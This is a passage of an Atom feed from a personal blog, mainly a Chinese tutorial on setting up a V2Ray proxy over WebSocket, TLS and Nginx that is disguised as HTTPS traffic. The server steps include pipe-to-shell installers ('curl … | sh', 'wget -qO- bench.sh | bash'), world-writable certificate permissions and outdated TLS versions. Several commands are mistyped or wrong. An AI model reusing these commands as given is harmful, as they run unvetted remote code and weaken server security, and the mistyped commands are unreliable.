<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Ye&#39;space</title>
  
  <subtitle>烨の小站</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://yespace.xyz/"/>
  <updated>2021-02-19T14:40:58.263Z</updated>
  <id>https://yespace.xyz/</id>
  
  <author>
    <name>Ye&#39;space</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>V2Ray + WebSocket + TLS + Nginx 伪装式代理</title>
    <link href="https://yespace.xyz/2020/03/03/V2Ray/"/>
    <id>https://yespace.xyz/2020/03/03/V2Ray/</id>
    <published>2020-03-03T06:33:48.000Z</published>
    <updated>2021-02-19T14:40:58.263Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>这是一篇V2Ray科学上网的服务端和客户端搭建教程，记录下自己的思考和实践过程<br><a id="more"></a></p></blockquote><h2 id="开始之前"><a href="#开始之前" class="headerlink" title="开始之前"></a>开始之前</h2><p>先说说自己的需求，一直是Google等墙外服务的的重度使用者，所以必须有一个速度客观的科学上网（以下简称<code>FQ</code>）途径。要实现长期、稳定、安全的<code>FQ</code>，从逻辑上说，无非两种可行的方式：一种是租界别人搭好的代理服务（即：机场），另一种就是租用境外VPS自己动手搭建。另外，自己需要一个长期的Linux服务器（数据库、网站、frp等），所以就选择了后者。也考虑过机场+阿里云学生套餐的方案，体验应该更加流畅，但按年费算下来严重超预算，加上一般机场的跑路成本太低不敢用、国内备案等琐事，果断放弃了改方案。</p><p>当然，不得不说的是，都2020年了自己租用VPS搭建单一线路的科学上网代理实在不是好主意，GFW流量监控策略只会更加严格，墙只会越来越高，优质线路的国际出口门槛也只会是水涨船高。想省事并且只有<code>FQ</code>需求的话，一些比较靠谱的机场还是比较不错的选择，我只临时用过几个公益性的机场（比如<a href="http://portal.ibcn.space/" target="_blank" rel="noopener">IBCN</a>）每个月20GB凑合着用也还可以。</p><h2 id="VPS代理"><a href="#VPS代理" class="headerlink" title="VPS代理"></a>VPS代理</h2><p>正文开始，VPS选择及初始化配置在这里——<a href="https://yespace.xyz/2019/12/24/VPS-Init-Config/">VPS Ubuntu-18.04 个人配置</a>。</p><ul><li>VPS提供商：<a href="https://cloudcone.com/" target="_blank" rel="noopener">CloudCone</a></li><li>系统：<a href="https://ubuntu.com/" target="_blank" rel="noopener">Ubuntu-18.04</a></li><li>代理工具：<a href="https://www.v2ray.com/" target="_blank" rel="noopener">Project V-V2Ray</a></li><li>反向代理工具：<a href="https://www.nginx.com/" target="_blank" rel="noopener">Nginx</a></li><li>DNS服务商：<a href="https://cloudflare.com/" target="_blank" rel="noopener">CloudFlare</a></li></ul><h3 id="加密-vs-伪装"><a href="#加密-vs-伪装" class="headerlink" title="加密 vs 伪装"></a>加密 vs 伪装</h3><p>当下的科学上网方式无非也就两种，一种是加密流量，一种是伪装流量。</p><p><strong>加密流量</strong>的代表就是Shadowsocks和ShadowsocksR（以下简称SS和SSR），以及V2Ray的VMess协议这种类型，它把你的网络流量加密封装成没有任何特征的数据包，但从墙的角度来看，你的流量就是未知的数据流量，其实这就是最明显的特征，虽然墙不知道里面的内容是什么，但是他可以判断数据量的大小，从而阻断，这也就是一到重大节假日各种VPS集体翻车的原因之一。其实仔细想想也对，小本本上早就记好了，平时可以睁一只眼闭一只眼，限制一下流量，到了需要断流的时候就是改个参数的问题。</p><p><strong>伪装流量</strong>简单来说就是全部伪装成正常的HTTPS流量，这就和我们平时访问网站的流量形态是一样的，这种流量是一种非常普遍的加密流量，对于墙来说，互联网上HTTPS的数据是海量的，他想要的这种海量数据中区分出哪个是梯子，这还是有很大难度的，更不会贸然阻断，所以伪装型的目前来看还算安全。</p><h3 id="伪装HTTPS"><a href="#伪装HTTPS" class="headerlink" title="伪装HTTPS"></a>伪装HTTPS</h3><p>目前伪装HTTPS流量的方式也有两种工具，分别是<code>Trojan</code>和<code>V2Ray+WebSocket+TSL</code>，从本质上说这两种方式基本等价，也可以说前者是后者的简化版。当然，V2Ray也可以完整兼容Shadowsocks的所有协议，从某种意义上V2Ray是一个全集，<code>Trojian</code>和<code>Shadowsocks</code>都是子集产物。本文就介绍一下使用V2Ray搭建代理服务器的配置以及Windows本地客户端设置的方式。</p><blockquote><p>V2Ray的配置指南<a href="(https://toutyrater.github.io/">这里</a>)有一篇非常好的教程，下面的内容摘录了其中一部分V2Ray配置，补充了Nginx和Windows客户端的设置部分</p></blockquote><h2 id="V2Ray服务端配置"><a href="#V2Ray服务端配置" class="headerlink" title="V2Ray服务端配置"></a>V2Ray服务端配置</h2><blockquote><p>根据之前的描述，以下的配置信息都是使用<code>V2Ray</code>的<code>WebSocket + TLS</code>模式来配置的</p></blockquote><h3 id="切换时区"><a href="#切换时区" class="headerlink" title="切换时区"></a>切换时区</h3><p>V2Ray 对于时间有比较严格的要求，要求服务器和客户端时间差绝对值不能超过 2 分钟，所以一定要保证时间足够准确。还好 V2Ray 并不要求时区一致。比如说自个儿电脑上的时间是北京时间（东 8 区）2020-03-04 12:08:31，但是 VPS 上的时区是东 9 区，所以 VPS 上的时间应该是2020-03-04 13:06:31 到 2020-03-04 13:10:31 之间才能正常使用 V2Ray。当然，也可以自行改成自己想要的时区。</p><p>这里我们修改时区和本地一致吧，输入如下命令：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo tzselect</span></span><br></pre></td></tr></table></figure></p><p>然后选择亚洲Asia，继续选择中国China，最后选择北京Beijing，然后创建时区软链接：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo ln -sf /usr/share/zoneinfo/Asia/Shanghai /etc/localtime</span></span><br></pre></td></tr></table></figure></p><p>这里注意一下，如果服务器架构是 OpenVZ，那么使用上面的命令有可能修改不了时区</p><h3 id="安装V2Ray"><a href="#安装V2Ray" class="headerlink" title="安装V2Ray"></a>安装V2Ray</h3><p>需要注意的是，与 Shadowsocks 不同，从软件上 V2Ray 不区分服务器版和客户端版，也就是说在服务器和客户端运行的 V2Ray 是同一个软件，区别只是配置文件的不同，因此 V2Ray 的安装在服务器和客户端上是一样的。</p><p>在 Linux 操作系统， V2Ray 的安装有脚本安装、手动安装、编译安装 3 种方式，选择其中一种即可，推荐使用脚本安装，该脚本由 V2Ray 官方提供。该脚本仅可以在 Debian 系列或者支持 Systemd 的 Linux 操作系统使用。首先下载脚本：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> wget https://install.direct/go.sh</span></span><br></pre></td></tr></table></figure></p><p>然后执行脚本安装 V2Ray：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo shell go.sh</span></span><br></pre></td></tr></table></figure></p><p>安装完之后，使用以下命令启动 V2Ray：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo systemctl start v2ray.services</span></span><br></pre></td></tr></table></figure></p><p><strong>更新问题：</strong>在 VPS，重新执行一遍安装脚本就可以更新了，在更新过程中会自动重启 V2Ray，配置文件保持不变<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo shell go.sh</span></span><br></pre></td></tr></table></figure></p><h3 id="V2Ray服务端配置文件"><a href="#V2Ray服务端配置文件" class="headerlink" title="V2Ray服务端配置文件"></a>V2Ray服务端配置文件</h3><p>编辑配置文件<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo vim /etc/v2ray/config.json</span></span><br></pre></td></tr></table></figure></p><p>输入内容如下：<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"log"</span>: &#123;</span><br><span class="line">    <span class="attr">"loglevel"</span>: <span class="string">"warning"</span>,</span><br><span class="line">    <span class="attr">"access"</span>: <span class="string">"/var/log/v2ray/access.log"</span>,</span><br><span class="line">    <span class="attr">"error"</span>: <span class="string">"/var/log/v2ray/error.log"</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">"inbounds"</span>: [&#123;</span><br><span class="line">    <span class="attr">"port"</span>: <span class="number">10000</span>,</span><br><span class="line">    <span class="attr">"listen"</span>: <span class="string">"127.0.0.1"</span>,</span><br><span class="line">    <span class="attr">"protocol"</span>: <span class="string">"vmess"</span>,</span><br><span class="line">    <span class="attr">"settings"</span>: &#123;</span><br><span class="line">      <span class="attr">"clients"</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">            //更改UUID</span><br><span class="line">          "id": "36b132ba-5e5f-4e02-9076-5bcb26a476b7",</span><br><span class="line">          "level": 1,</span><br><span class="line">          "alterId": 64</span><br><span class="line">        &#125;</span><br><span class="line">      ]</span><br><span class="line">    &#125;,</span><br><span class="line">    "streamSettings": &#123;</span><br><span class="line">        "network": "ws",</span><br><span class="line">        "wsSettings": &#123;</span><br><span class="line">        "path": "/ray"</span><br><span class="line">        &#125;</span><br><span class="line">     &#125;</span><br><span class="line">  &#125;],</span><br><span class="line">  "outbounds": [&#123;</span><br><span class="line">    "protocol": "freedom",</span><br><span class="line">    "settings": &#123;&#125;</span><br><span class="line">  &#125;,&#123;</span><br><span class="line">    "protocol": "blackhole",</span><br><span class="line">    "settings": &#123;&#125;,</span><br><span class="line">    "tag": "blocked"</span><br><span class="line">  &#125;],</span><br><span class="line">  "routing": &#123;</span><br><span class="line">    "rules": [</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">"type"</span>: <span class="string">"field"</span>,</span><br><span class="line">        <span class="attr">"ip"</span>: [<span class="string">"geoip:private"</span>],</span><br><span class="line">        <span class="attr">"outboundTag"</span>: <span class="string">"blocked"</span></span><br><span class="line">      &#125;</span><br><span class="line">    ]</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>其中的id字段即uuid，相当于ss中的密码，为了避免重复，可以使用<a href="https://www.uuidgenerator.net/" target="_blank" rel="noopener">在线uuid生成器</a>随机生成一个</p><h3 id="重启V2Ray"><a href="#重启V2Ray" class="headerlink" title="重启V2Ray"></a>重启V2Ray</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo systemctl restart v2ray</span></span><br></pre></td></tr></table></figure><p>此时，V2Ray已经重新启动并且以Websocket的方式在<code>127.0.0.1:10000</code>上运行</p><h3 id="申请SSL证书"><a href="#申请SSL证书" class="headerlink" title="申请SSL证书"></a>申请SSL证书</h3><h4 id="安装acme-sh"><a href="#安装acme-sh" class="headerlink" title="安装acme.sh"></a>安装acme.sh</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> curl https://get.acme.sh | sh</span></span><br></pre></td></tr></table></figure><p>然后重新载入一下<code>.shellrc</code><br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">source</span> ~/.shellrc</span></span><br></pre></td></tr></table></figure></p><p>申请Let’ s Encrypt提供的免费 SSL 证书，这里我们使用的域名解析商是<a href="https://cloudflare.com/" target="_blank" rel="noopener">CloudFlare</a>。<br>首先导入CF的密钥，密钥获取方式CloudFlare网站上就有。<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">export</span> CF_Key=<span class="string">"your_cf_key"</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">export</span> CF_Email=<span class="string">"your_cf_email"</span></span></span><br></pre></td></tr></table></figure></p><h4 id="申请证书"><a href="#申请证书" class="headerlink" title="申请证书"></a>申请证书</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">//创建证书保存目录</span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo mkdir /usr/<span class="built_in">local</span>/etc/cert/</span></span><br><span class="line">//添加权限</span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo chmod 777 -R /usr/<span class="built_in">local</span>/etc/cert/</span></span><br><span class="line">//申请证书，这里使用ec-256椭圆加密算法</span><br><span class="line"><span class="meta">$</span><span class="bash"> acme.sh --issue --dns dns_cf -d your_server_name -k ec-256</span></span><br><span class="line">//安装证书到文件</span><br><span class="line"><span class="meta">$</span><span class="bash"> acme.sh --installcert -d your_server_name --ecc \</span></span><br><span class="line">    --key-file /usr/local/etc/cert/your_server_name.key \</span><br><span class="line">    --fullchain-file /usr/local/etc/cert/your_server_name.cer</span><br></pre></td></tr></table></figure><h3 id="配置-Nginx-服务"><a href="#配置-Nginx-服务" class="headerlink" title="配置 Nginx 服务"></a>配置 Nginx 服务</h3><h4 id="安装-Nginx"><a href="#安装-Nginx" class="headerlink" title="安装 Nginx"></a>安装 Nginx</h4><p>如果服务器上已经安装好Nginx服务，可以跳过这一节。这里在ubuntu上操作，所以使用apt直接安装就行<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo apt-get install nginx</span></span><br></pre></td></tr></table></figure></p><h4 id="防火墙开启Web端口"><a href="#防火墙开启Web端口" class="headerlink" title="防火墙开启Web端口"></a>防火墙开启Web端口</h4><p>这里使用<code>iptables</code>直接开启，ubuntu上也可以使用<code>ufw</code>工具<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> iptables -A INPUT -p tcp -m multiport --<span class="built_in">source</span>-port 80,443 -j ACCEPT</span></span><br></pre></td></tr></table></figure></p><h4 id="修改配置文件"><a href="#修改配置文件" class="headerlink" title="修改配置文件"></a>修改配置文件</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo vim /etc/nginx/sites-available/v2ray</span></span><br></pre></td></tr></table></figure><p>配置文件如下：<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">  listen  443 ssl;</span><br><span class="line">  ssl on;</span><br><span class="line">  # 你的密钥路径</span><br><span class="line">  ssl_certificate       /usr/local/etc/cert/your_server_name.cer;</span><br><span class="line">  ssl_certificate_key   /usr/local/etc/cert/your_server_name.key;</span><br><span class="line">  ssl_protocols         TLSv1 TLSv1.1 TLSv1.2;</span><br><span class="line">  ssl_ciphers           HIGH:!aNULL:!MD5;</span><br><span class="line">  # 你的服务器名称</span><br><span class="line">  server_name           your_server_name;</span><br><span class="line">    location /ray &#123;</span><br><span class="line">        proxy_redirect off;</span><br><span class="line">        proxy_pass http://127.0.0.1:10000;</span><br><span class="line">        proxy_http_version 1.1;</span><br><span class="line">        proxy_set_header Upgrade $http_upgrade;</span><br><span class="line">        proxy_set_header Connection "upgrade";</span><br><span class="line">        proxy_set_header Host $http_host;</span><br><span class="line"></span><br><span class="line">        # Show realip in v2ray access.log</span><br><span class="line">        proxy_set_header X-Real-IP $remote_addr;</span><br><span class="line">        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>添加软链接开启服务<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo ln -s /etc/nginx/sites-available/v2ray /etc/nginx/sites-enable/v2ray</span></span><br></pre></td></tr></table></figure></p><h4 id="重启Nginx服务"><a href="#重启Nginx服务" class="headerlink" title="重启Nginx服务"></a>重启Nginx服务</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo systemctl restart nginx</span></span><br></pre></td></tr></table></figure><p>OK，到这里没有问题的话V2Ray服务端配置就完成了</p><h2 id="V2Ray客户端配置"><a href="#V2Ray客户端配置" class="headerlink" title="V2Ray客户端配置"></a>V2Ray客户端配置</h2><h3 id="客户端安装"><a href="#客户端安装" class="headerlink" title="客户端安装"></a>客户端安装</h3><p>点<a href="https://github.com/v2ray/v2ray-core/releases" target="_blank" rel="noopener">这里</a>下载 V2Ray 的 Windows 压缩包，如果是 32 位系统，下载 v2ray-windows-32.zip，如果是 64 位系统，下载 v2ray-windows-64.zip（下载速度慢或无法下载，<a href="https://share.weiyun.com/58WSrcx" target="_blank" rel="noopener">这里</a>我做了个备份）。下载并且解压之后会有下面这些文件：</p><ul><li>v2ray.exe 运行 V2Ray 的程序文件</li><li>wv2ray.exe 同 v2ray.exe，区别在于wv2ray.exe是后台运行的，不像 v2ray.exe 会有类似于 cmd 控制台的窗口。运行 V2Ray 时从 v2ray.exe 和 wv2ray.exe 中任选一个即可</li><li>config.json V2Ray 的配置文件，后面我们对 V2Ray 进行配置其实就是修改这个文件</li><li>v2ctl.exe V2Ray 的工具，有多种功能，除特殊用途外，一般由 v2ray.exe 来调用，用户不用太关心</li><li>geosite.dat 用于路由的域名文件</li><li>geoip.dat 用于路由的 IP 文件</li><li>其它 除上面的提到文件外，其他的不是运行 V2Ray 的必要文件。更详细的说明可以看 doc 文件夹下的 readme.md 文件</li></ul><p>实际上双击<code>v2ray.exe</code>就可以运行 V2Ray 了，V2Ray 会读取 config.json 中的配置与服务器连接。</p><h3 id="V2Ray客户端配置文件"><a href="#V2Ray客户端配置文件" class="headerlink" title="V2Ray客户端配置文件"></a>V2Ray客户端配置文件</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"inbounds"</span>: [&#123;</span><br><span class="line">    <span class="attr">"port"</span>: <span class="number">1080</span>,</span><br><span class="line">    <span class="attr">"listen"</span>: <span class="string">"127.0.0.1"</span>,</span><br><span class="line">    <span class="attr">"tag"</span>: <span class="string">"socks-inbound"</span>,</span><br><span class="line">    <span class="attr">"protocol"</span>: <span class="string">"socks"</span>,</span><br><span class="line">    <span class="attr">"settings"</span>: &#123;</span><br><span class="line">      <span class="attr">"auth"</span>: <span class="string">"noauth"</span>,</span><br><span class="line">      <span class="attr">"udp"</span>: <span class="literal">false</span>,</span><br><span class="line">      <span class="attr">"ip"</span>: <span class="string">"127.0.0.1"</span></span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    <span class="attr">"sniffing"</span>: &#123;</span><br><span class="line">      <span class="attr">"enabled"</span>: <span class="literal">true</span>,</span><br><span class="line">      <span class="attr">"destOverride"</span>: [<span class="string">"http"</span>, <span class="string">"tls"</span>]</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;],</span><br><span class="line">  <span class="attr">"outbounds"</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">"protocol"</span>: <span class="string">"vmess"</span>,</span><br><span class="line">      <span class="attr">"settings"</span>: &#123;</span><br><span class="line">        <span class="attr">"vnext"</span>: [</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="attr">"address"</span>: <span class="string">"your_server_name"</span>,</span><br><span class="line">            <span class="attr">"port"</span>: <span class="number">443</span>,</span><br><span class="line">            <span class="attr">"users"</span>: [</span><br><span class="line">              &#123;</span><br><span class="line">                  //与上面一致</span><br><span class="line">                "id": "36b132ba-5e5f-4e02-9076-5bcb26a476b7",</span><br><span class="line">                "alterId": 64</span><br><span class="line">              &#125;</span><br><span class="line">            ]</span><br><span class="line">          &#125;</span><br><span class="line">        ]</span><br><span class="line">      &#125;,</span><br><span class="line">      "streamSettings": &#123;</span><br><span class="line">        "network": "ws",</span><br><span class="line">        "security": "tls",</span><br><span class="line">        "wsSettings": &#123;</span><br><span class="line">          "path": "/ray"</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="浏览器代理"><a href="#浏览器代理" class="headerlink" title="浏览器代理"></a>浏览器代理</h3><p>这里我们在Chrome浏览器中使用SwitchyOmega插件作为切换代理上网，当然也可以手动设置代理为<code>127.0.0.1:1080</code>，但是使用SwitchyOmega可以添加<code>gfwlist</code>自动切换代理。</p><h4 id="SwitchyOmega下载"><a href="#SwitchyOmega下载" class="headerlink" title="SwitchyOmega下载"></a>SwitchyOmega下载</h4><ul><li>在线安装<br>从<a href="https://chrome.google.com/webstore/detail/padekgcemlokbadohgkifijomclgjgif" target="_blank" rel="noopener">Chrome 应用商店 </a>安装，如果无法从该链接安装，请使用下面的离线安装。</li><li>离线安装<br>去<a href="https://github.com/FelisCatus/SwitchyOmega/releases" target="_blank" rel="noopener">Github 下载</a>最新版安装包 ，或者直接<a href="https://share.weiyun.com/58WSrcx" target="_blank" rel="noopener">我的备份</a>进行安装。<h4 id="SwitchyOmega配置"><a href="#SwitchyOmega配置" class="headerlink" title="SwitchyOmega配置"></a>SwitchyOmega配置</h4><img src="https://yespace-1254021701.cos.ap-beijing.myqcloud.com/images/v2ray/pic1.png" alt="UTOOLS1585052199747.png"><br><img src="https://yespace-1254021701.cos.ap-beijing.myqcloud.com/images/v2ray/pic2.png" alt="UTOOLS1585052274369.png"></li></ul><blockquote><p>gfwlist规则网址：<a href="https://raw.githubusercontent.com/gfwlist/gfwlist/master/gfwlist.txt" target="_blank" rel="noopener">https://raw.githubusercontent.com/gfwlist/gfwlist/master/gfwlist.txt</a></p></blockquote><p>OK，到这里就可以使用V2Ray放心的科学上网了！</p><h3 id="使用NSSM将V2Ray部署为windows系统服务"><a href="#使用NSSM将V2Ray部署为windows系统服务" class="headerlink" title="使用NSSM将V2Ray部署为windows系统服务"></a>使用NSSM将V2Ray部署为windows系统服务</h3><p>emmm，v2ray-core的官方版本应用没有GUI（当然可以使用第三方GUI，这里就不介绍了），所以每次使用都必须打开控制台。这里我们使用NSSM将V2Ray部署为windows系统服务，开机自启，无感科学上网。<br><img src="https://yespace-1254021701.cos.ap-beijing.myqcloud.com/images/v2ray/pic3.png" alt="UTOOLS1585053014297.png"></p><h4 id="NSSM"><a href="#NSSM" class="headerlink" title="NSSM"></a>NSSM</h4><p>NSSM 是一个服务封装程序，它可以将普通 exe 程序或 Nodejs 项目封装成服务，像 windows 服务一样运行。同类型的工具还有微软自己的 srvany，不过 nssm 更加简单易用，并且功能强大。<br>官网：<a href="https://nssm.cc/" target="_blank" rel="noopener">https://nssm.cc/</a></p><h4 id="服务安装"><a href="#服务安装" class="headerlink" title="服务安装"></a>服务安装</h4><p>服务安装可以使用如下命令： <code>nssm install &lt;servicename&gt;</code><br>直接在 nssm.exe 所在目录运行命令行，输入：<code>nssw install + servicename</code></p><p>之后会弹出设置界面，需要做的就是:</p><ul><li>设置可执行文件</li><li>增加执行参数</li><li>设置服务名称</li></ul><p><img src="https://yespace-1254021701.cos.ap-beijing.myqcloud.com/images/v2ray/pic4.png" alt="UTOOLS1585053295853.png"></p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;这是一篇V2Ray科学上网的服务端和客户端搭建教程，记录下自己的思考和实践过程&lt;br&gt;
    
    </summary>
    
      <category term="折腾笔记" scheme="https://yespace.xyz/categories/%E6%8A%98%E8%85%BE%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="V2Ray" scheme="https://yespace.xyz/tags/V2Ray/"/>
    
      <category term="Nginx" scheme="https://yespace.xyz/tags/Nginx/"/>
    
      <category term="VPS" scheme="https://yespace.xyz/tags/VPS/"/>
    
  </entry>
  
  <entry>
    <title>Latex Test</title>
    <link href="https://yespace.xyz/2019/12/30/LatexTest/"/>
    <id>https://yespace.xyz/2019/12/30/LatexTest/</id>
    <published>2019-12-30T09:41:48.000Z</published>
    <updated>2021-01-01T03:20:00.094Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="6ca402e439fbbe4a8c4e9b189984878dc18a83f29671d6db35dd52ea237c1e5a"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Welcome to my blog, enter password to read.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Welcome to my blog, enter password to read.
    
    </summary>
    
      <category term="折腾笔记" scheme="https://yespace.xyz/categories/%E6%8A%98%E8%85%BE%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="测试" scheme="https://yespace.xyz/tags/%E6%B5%8B%E8%AF%95/"/>
    
      <category term="Latex" scheme="https://yespace.xyz/tags/Latex/"/>
    
  </entry>
  
  <entry>
    <title>VPS Ubuntu-18.04 个人配置</title>
    <link href="https://yespace.xyz/2019/12/24/VPS-Init-Config/"/>
    <id>https://yespace.xyz/2019/12/24/VPS-Init-Config/</id>
    <published>2019-12-24T14:41:48.000Z</published>
    <updated>2019-12-30T09:44:57.086Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>记录一下自己Ubuntu的基本配置，方便下次换VPS。emmm，在用docker前还是有必要的</p></blockquote><h2 id="简单跑个分"><a href="#简单跑个分" class="headerlink" title="简单跑个分"></a>简单跑个分</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ssh root@server_address</span></span><br><span class="line">// https://teddysun.com/444.html 测试脚本</span><br><span class="line"><span class="meta">$</span><span class="bash"> wget -qO- bench.sh | bash</span></span><br></pre></td></tr></table></figure><a id="more"></a><p><img src="https://yes-images-1254021701.cos.ap-beijing.myqcloud.com/UTOOLS1577113398914.png" alt="UTOOLS1577113398914.png"></p><blockquote><p><a href="https://cloudcone.com" target="_blank" rel="noopener">CLOUDCONE</a> 促销活动，3$/月，KVM，1Gbps + 3T, 1 ipv4 + 3 ipv6</p></blockquote><h2 id="添加用户"><a 